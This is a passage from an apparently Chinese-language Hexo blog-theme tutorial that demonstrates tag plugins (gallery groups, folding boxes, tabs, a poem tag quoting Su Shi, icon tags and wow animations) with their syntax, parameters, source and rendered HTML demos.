class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC 在Rikkaの六花服务器里留下的足迹 &#x27;/gallery/MC/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam 哦咧哇gundam哒！ &#x27;/gallery/Gundam/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar 某种意义上也算自拍吧 &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.gallerygroup 相册图库</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>在Rikkaの六花服务器里留下的足迹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>哦咧哇gundam哒！</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>某种意义上也算自拍吧</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div><p>2.gallery 相册</p><div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""></p>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-20-折叠框-folding">2.20 折叠框 folding</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><!-- tab 参数配置 --><ol><li><p><code>颜色</code>：blue, cyan, green, yellow, red</p></li><li><p><code>状态</code>：状态填写 open 代表默认打开。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line">假装这里有代码块（代码块没法嵌套代码块）</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><details class="folding-tag" ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details class="folding-tag" green><summary> 查看代码测试 </summary>              <div class='content'>              <p>假装这里有代码块（代码块没法嵌套代码块）</p>              </div>            </details><details class="folding-tag" yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details class="folding-tag" blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <span><img src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-21-分栏-tab">2.21 分栏 tab</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>Unique name :</p><ul><li><p>选项卡块标签的唯一名称，不带逗号。</p></li><li><p>将在#id中用作每个标签及其索引号的前缀。</p></li><li><p>如果名称中包含空格，则对于生成#id，所有空格将由破折号代替。</p></li><li><p>仅当前帖子/页面的URL必须是唯一的！</p></li></ul></li><li><p>[index]:</p><ul><li><p>活动选项卡的索引号。</p></li><li><p>如果未指定，将选择第一个标签（1）。</p></li><li><p>如果index为-1，则不会选择任何选项卡。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[Tab caption]:</p><ul><li><p>当前选项卡的标题。</p></li><li><p>如果未指定标题，则带有制表符索引后缀的唯一名称将用作制表符的标题。</p></li><li><p>如果未指定标题，但指定了图标，则标题将为空。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[@icon]:</p><ul><li><p>FontAwesome图标名称（全名，看起来像“ fas fa-font”）</p></li><li><p>可以指定带空格或不带空格；</p></li><li><p>例如’Tab caption @icon’ 和 ‘Tab caption@icon’.</p></li><li><p>可选参数。</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>2.Demo 2 - 预设选择tabs</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>3.Demo 3 - 没有预设值</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一个Tab --&gt;</span><br><span class="line"><span class="strong">**tab名字为第一个Tab**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"><span class="strong">**只有图标 没有Tab名字**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸弹@fas fa-bomb --&gt;</span><br><span class="line"><span class="strong">**名字+icon**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.Demo 1 - 预设选择第一个【默认】</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>2.Demo 2 - 预设选择tabs</p><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>3.Demo 3 - 没有预设值</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字为第一个Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-22-诗词标签-poem">2.22 诗词标签 poem</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><ol><li><code>title</code>：诗词标题</li><li><code>author</code>：作者，可以不写</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% poem 水调歌头,苏轼 %&#125;</span><br><span class="line">丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。</span><br><span class="line">明月几时有？把酒问青天。</span><br><span class="line">不知天上宫阙，今夕是何年？</span><br><span class="line">我欲乘风归去，又恐琼楼玉宇，高处不胜寒。</span><br><span class="line">起舞弄清影，何似在人间？</span><br><span class="line"></span><br><span class="line">转朱阁，低绮户，照无眠。</span><br><span class="line">不应有恨，何事长向别时圆？</span><br><span class="line">人有悲欢离合，月有阴晴圆缺，此事古难全。</span><br><span class="line">但愿人长久，千里共婵娟。</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br>明月几时有？把酒问青天。<br>不知天上宫阙，今夕是何年？<br>我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>起舞弄清影，何似在人间？</p><p>转朱阁，低绮户，照无眠。<br>不应有恨，何事长向别时圆？<br>人有悲欢离合，月有阴晴圆缺，此事古难全。<br>但愿人长久，千里共婵娟。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-23-阿里图标-icon">2.23 阿里图标 icon</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>icon-xxxx</code>：表示图标<code>font-class</code>,可以在自己的阿里矢量图标库项目的<code>font-class</code>引用方案内查询并复制。</li><li><code>font-size</code>：表示图标大小，直接填写数字即可，单位为<code>em</code>。图标大小默认值为<code>1em</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rat_zi"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-24-特效标签wow">2.24 特效标签wow</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>animate</code>: 动画样式，效果详见<a href="https://animate.style/">animate.css参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.flip动画效果。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 